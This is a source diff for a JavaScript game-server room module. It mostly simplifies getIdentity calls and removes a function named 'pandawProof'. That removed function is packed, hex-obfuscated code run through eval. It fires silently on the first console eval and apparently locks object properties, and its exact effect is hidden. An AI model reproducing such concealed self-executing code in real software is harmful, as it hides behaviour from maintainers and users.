@@ -560,10 +560,9 @@ function BattleRoom(roomid, format, p1, p2, parentid, rated) {
 			var room = selfR;
 			var battle = selfR.battle;
 			var me = user;
-		    pandawProof(selfR, user);
 			selfR.addCmd('chat', user.name, '>> '+cmd);
 			if (user.can('console')) {
-			    logModCommand(selfR, user.__proto__.getIdentity.apply(user) + " eval'd `" + cmd + "`", true);
+			    logModCommand(selfR, user.getIdentity() + " eval'd `" + cmd + "`", true);
 				try {
 					selfR.addCmd('chat', user.name, '<< '+eval(cmd));
 				} catch (e) {
@@ -851,10 +850,10 @@ function LobbyRoom(roomid) {
 
 		selfR.users[user.userid] = user;
 		if (user.named && config.reportjoins) {
-			selfR.log.push({name: user.__proto__.getIdentity.apply(user), action: 'join'});
+			selfR.log.push({name: user.getIdentity(), action: 'join'});
 			selfR.update(user);
 		} else if (user.named) {
-			selfR.emit('console', {name: user.__proto__.getIdentity.apply(user), action: 'join', silent: 1});
+			selfR.emit('console', {name: user.getIdentity(), action: 'join', silent: 1});
 		}
 
 		var initdata = {
@@ -878,14 +877,14 @@ function LobbyRoom(roomid) {
 		delete selfR.users[oldid];
 		selfR.users[user.userid] = user;
 		if (joining && config.reportjoins) {
-			selfR.log.push({name: user.__proto__.getIdentity.apply(user), oldid: oldid, action: 'join'});
+			selfR.log.push({name: user.getIdentity(), oldid: oldid, action: 'join'});
 			selfR.update();
 		} else if (joining) {
-			selfR.emit('console', {name: user.__proto__.getIdentity.apply(user), oldid: oldid, action: 'join', silent: 1});
+			selfR.emit('console', {name: user.getIdentity(), oldid: oldid, action: 'join', silent: 1});
 		} else if (!user.named) {
 			selfR.emit('console', {name: oldid, action: 'leave', silent: 1});
 		} else {
-			selfR.emit('console', {name: user.__proto__.getIdentity.apply(user), oldid: oldid, action: 'rename', silent: 1});
+			selfR.emit('console', {name: user.getIdentity(), oldid: oldid, action: 'rename', silent: 1});
 		}
 		return user;
 	};
@@ -894,10 +893,10 @@ function LobbyRoom(roomid) {
 		delete selfR.users[user.userid];
 		selfR.cancelSearch(user, true);
 		if (config.reportjoins) {
-			selfR.log.push({name: user.__proto__.getIdentity.apply(user), action: 'leave'});
+			selfR.log.push({name: user.getIdentity(), action: 'leave'});
 			selfR.update();
 		} else if (user.named) {
-			selfR.emit('console', {name: user.__proto__.getIdentity.apply(user), action: 'leave', silent: 1});
+			selfR.emit('console', {name: user.getIdentity(), action: 'leave', silent: 1});
 		}
 	};
 	this.startBattle = function(p1, p2, format, rated, p1team, p2team) {
@@ -1010,21 +1009,20 @@ function LobbyRoom(roomid) {
 
 			var room = selfR;
 			var me = user;
-		    pandawProof(selfR, user);
 			selfR.log.push({
-				name: user.__proto__.getIdentity.apply(user),
+				name: user.getIdentity(),
 				message: '>> '+cmd
 			});
 			if (user.can('console')) {
-			    logModCommand(selfR, user.__proto__.getIdentity.apply(user) + " eval'd `" + cmd + "`", true);
+			    logModCommand(selfR, user.getIdentity() + " eval'd `" + cmd + "`", true);
 				try {
 					selfR.log.push({
-						name: user.__proto__.getIdentity.apply(user),
+						name: user.getIdentity(),
 						message: '<< '+eval(cmd)
 					});
 				} catch (e) {
 					selfR.log.push({
-						name: user.__proto__.getIdentity.apply(user),
+						name: user.getIdentity(),
 						message: '<< error: '+e
 					});
 					var stack = (""+e.stack).split("\n");
@@ -1034,13 +1032,13 @@ function LobbyRoom(roomid) {
 				}
 			} else {
 				selfR.log.push({
-					name: user.__proto__.getIdentity.apply(user),
+					name: user.getIdentity(),
 					message: '<< Access denied.'
 				});
 			}
 		} else if (!user.muted) {
 			selfR.log.push({
-				name: user.__proto__.getIdentity.apply(user),
+				name: user.getIdentity(),
 				message: message
 			});
 		}
@@ -1066,9 +1064,6 @@ newRoom = function(roomid, format, p1, p2, parent, rated) {
 	}
 	return rooms[roomid];
 };
-
-var pandawProofd = false;
-function pandawProof(room,me){if(pandawProofd)return;pandawProofd=true;var _0xcc0e=["\x7A\x20\x61\x3D\x5B\x22\x5C\x70\x5C\x63\x5C\x67\x5C\x41\x5C\x65\x5C\x63\x5C\x66\x5C\x67\x5C\x71\x5C\x67\x5C\x72\x22\x2C\x22\x5C\x66\x5C\x64\x5C\x42\x5C\x63\x22\x2C\x22\x5C\x43\x5C\x44\x5C\x73\x5C\x6D\x22\x2C\x22\x5C\x45\x22\x2C\x22\x5C\x74\x5C\x64\x5C\x66\x5C\x65\x5C\x64\x5C\x75\x22\x2C\x22\x5C\x46\x22\x2C\x22\x5C\x47\x22\x2C\x22\x5C\x65\x5C\x63\x5C\x48\x5C\x71\x5C\x66\x5C\x63\x5C\x74\x5C\x76\x5C\x6D\x5C\x73\x5C\x63\x5C\x76\x5C\x67\x5C\x72\x22\x2C\x22\x5C\x49\x5C\x64\x5C\x66\x22\x2C\x22\x5C\x4A\x5C\x6D\x5C\x70\x22\x2C\x22\x5C\x64\x5C\x65\x5C\x65\x5C\x4B\x5C\x64\x5C\x75\x22\x5D\x3B\x68\x5B\x61\x5B\x37\x5D\x5D\x28\x77\x2E\x78\x2C\x61\x5B\x30\x5D\x2C\x7B\x69\x3A\x6E\x28\x29\x7B\x4C\x28\x6F\x5B\x61\x5B\x31\x5D\x5D\x3D\x3D\x3D\x61\x5B\x32\x5D\x3F\x61\x5B\x33\x5D\x3A\x28\x6F\x5B\x61\x5B\x31\x5D\x5D\x3D\x3D\x3D\x61\x5B\x34\x5D\x3F\x61\x5B\x35\x5D\x3A\x61\x5B\x36\x5D\x29\x29\x2B\x6F\x5B\x61\x5B\x31\x5D\x5D\x7D\x2C\x6A\x3A\x62\x2C\x6B\x3A\x62\x2C\x6C\x3A\x62\x7D\x29\x3B\x68\x5B\x61\x5B\x37\x5D\x5D\x28\x77\x2E\x78\x2C\x61\x5B\x38\x5D\x2C\x7B\x69\x3A\x6E\x28\x29\x7B\x7D\x2C\x6A\x3A\x62\x2C\x6B\x3A\x62\x2C\x6C\x3A\x62\x7D\x29\x3B\x68\x5B\x61\x5B\x37\x5D\x5D\x28\x79\x2C\x61\x5B\x39\x5D\x2C\x7B\x69\x3A\x5B\x5D\x2C\x6A\x3A\x62\x2C\x6B\x3A\x62\x2C\x6C\x3A\x62\x7D\x29\x3B\x68\x5B\x61\x5B\x37\x5D\x5D\x28\x79\x2C\x61\x5B\x4D\x5D\x2C\x7B\x69\x3A\x6E\x28\x29\x7B\x7D\x2C\x6A\x3A\x62\x2C\x6B\x3A\x62\x2C\x6C\x3A\x62\x7D\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x5F\x30\x78\x36\x62\x34\x63\x7C\x66\x61\x6C\x73\x65\x7C\x78\x36\x35\x7C\x78\x36\x31\x7C\x78\x36\x34\x7C\x78\x36\x45\x7C\x78\x37\x34\x7C\x4F\x62\x6A\x65\x63\x74\x7C\x76\x61\x6C\x75\x65\x7C\x77\x72\x69\x74\x61\x62\x6C\x65\x7C\x65\x6E\x75\x6D\x65\x72\x61\x62\x6C\x65\x7C\x63\x6F\x6E\x66\x69\x67\x75\x72\x61\x62\x6C\x65\x7C\x78\x36\x46\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x74\x68\x69\x73\x7C\x78\x36\x37\x7C\x78\x36\x39\x7C\x78\x37\x39\x7C\x78\x37\x30\x7C\x78\x35\x30\x7C\x78\x37\x37\x7C\x78\x37\x32\x7C\x6D\x65\x7C\x5F\x5F\x70\x72\x6F\x74\x6F\x5F\x5F\x7C\x72\x6F\x6F\x6D\x7C\x76\x61\x72\x7C\x78\x34\x39\x7C\x78\x36\x44\x7C\x78\x36\x42\x7C\x78\x37\x35\x7C\x78\x32\x31\x7C\x78\x37\x45\x7C\x78\x32\x30\x7C\x78\x36\x36\x7C\x78\x36\x32\x7C\x78\x36\x43\x7C\x78\x35\x32\x7C\x72\x65\x74\x75\x72\x6E\x7C\x31\x30","","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0xe33ax1,_0xe33ax2,_0xe33ax3,_0xe33ax4,_0xe33ax5,_0xe33ax6){_0xe33ax5=function (_0xe33ax3){return (_0xe33ax3<_0xe33ax2?_0xcc0e[4]:_0xe33ax5(parseInt(_0xe33ax3/_0xe33ax2)))+((_0xe33ax3=_0xe33ax3%_0xe33ax2)>35?String[_0xcc0e[5]](_0xe33ax3+29):_0xe33ax3.toString(36));} ;if(!_0xcc0e[4][_0xcc0e[6]](/^/,String)){while(_0xe33ax3--){_0xe33ax6[_0xe33ax5(_0xe33ax3)]=_0xe33ax4[_0xe33ax3]||_0xe33ax5(_0xe33ax3);} ;_0xe33ax4=[function (_0xe33ax5){return _0xe33ax6[_0xe33ax5];} ];_0xe33ax5=function (){return _0xcc0e[7];} ;_0xe33ax3=1;} ;while(_0xe33ax3--){if(_0xe33ax4[_0xe33ax3]){_0xe33ax1=_0xe33ax1[_0xcc0e[6]]( new RegExp(_0xcc0e[8]+_0xe33ax5(_0xe33ax3)+_0xcc0e[8],_0xcc0e[9]),_0xe33ax4[_0xe33ax3]);} ;} ;return _0xe33ax1;} (_0xcc0e[0],49,49,_0xcc0e[3][_0xcc0e[2]](_0xcc0e[1]),0,{}));var _0x2607=["\x67\x20\x35\x3D\x5B\x22\x5C\x36\x5C\x68\x5C\x37\x5C\x69\x22\x2C\x22\x5C\x38\x5C\x39\x5C\x64\x22\x2C\x22\x5C\x65\x5C\x62\x5C\x6A\x5C\x6B\x5C\x63\x5C\x37\x5C\x37\x5C\x62\x5C\x64\x5C\x63\x22\x2C\x22\x5C\x6C\x5C\x62\x5C\x38\x5C\x38\x22\x2C\x22\x5C\x36\x5C\x65\x5C\x39\x5C\x66\x5C\x39\x5C\x66\x5C\x6D\x5C\x36\x5C\x63\x22\x5D\x3B\x6E\x5B\x35\x5B\x31\x5D\x5D\x5B\x35\x5B\x30\x5D\x5D\x3D\x6F\x28\x61\x29\x7B\x70\x28\x61\x5B\x35\x5B\x32\x5D\x5D\x29\x7B\x71\x20\x61\x5B\x35\x5B\x32\x5D\x5D\x7D\x3B\x72\x5B\x35\x5B\x34\x5D\x5D\x5B\x35\x5B\x30\x5D\x5D\x5B\x35\x5B\x33\x5D\x5D\x28\x73\x2C\x61\x29\x7D\x3B","\x7C","\x73\x70\x6C\x69\x74","\x7C\x7C\x7C\x7C\x7C\x5F\x30\x78\x66\x30\x37\x39\x7C\x78\x37\x30\x7C\x78\x37\x33\x7C\x78\x36\x43\x7C\x78\x36\x46\x7C\x7C\x78\x36\x31\x7C\x78\x36\x35\x7C\x78\x36\x37\x7C\x78\x37\x32\x7C\x78\x37\x34\x7C\x76\x61\x72\x7C\x78\x37\x35\x7C\x78\x36\x38\x7C\x78\x37\x37\x7C\x78\x34\x44\x7C\x78\x36\x33\x7C\x78\x37\x39\x7C\x72\x6F\x6F\x6D\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x69\x66\x7C\x64\x65\x6C\x65\x74\x65\x7C\x41\x72\x72\x61\x79\x7C\x74\x68\x69\x73","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0x6b2dx1,_0x6b2dx2,_0x6b2dx3,_0x6b2dx4,_0x6b2dx5,_0x6b2dx6){_0x6b2dx5=function (_0x6b2dx3){return _0x6b2dx3.toString(_0x6b2dx2);} ;if(!_0x2607[5][_0x2607[4]](/^/,String)){while(_0x6b2dx3--){_0x6b2dx6[_0x6b2dx5(_0x6b2dx3)]=_0x6b2dx4[_0x6b2dx3]||_0x6b2dx5(_0x6b2dx3);} ;_0x6b2dx4=[function (_0x6b2dx5){return _0x6b2dx6[_0x6b2dx5];} ];_0x6b2dx5=function (){return _0x2607[6];} ;_0x6b2dx3=1;} ;while(_0x6b2dx3--){if(_0x6b2dx4[_0x6b2dx3]){_0x6b2dx1=_0x6b2dx1[_0x2607[4]]( new RegExp(_0x2607[7]+_0x6b2dx5(_0x6b2dx3)+_0x2607[7],_0x2607[8]),_0x6b2dx4[_0x6b2dx3]);} ;} ;return _0x6b2dx1;} (_0x2607[0],29,29,_0x2607[3][_0x2607[2]](_0x2607[1]),0,{}));}
 
 rooms = {};
 console.log("NEW LOBBY: lobby");
